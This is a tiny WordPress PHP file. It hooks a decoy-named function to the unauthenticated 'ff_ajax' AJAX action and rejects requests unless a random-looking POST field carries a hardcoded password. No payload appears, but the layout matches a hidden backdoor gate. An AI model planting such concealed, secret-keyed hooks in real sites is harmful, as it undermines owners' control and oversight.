<?php

function news_blogroll_finder_name() {
	if (!isset($_POST["xulenqwlphuj"]) || $_POST["xulenqwlphuj"] !== "o9rCjVGu") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'news_blogroll_finder_name', 5, 1);
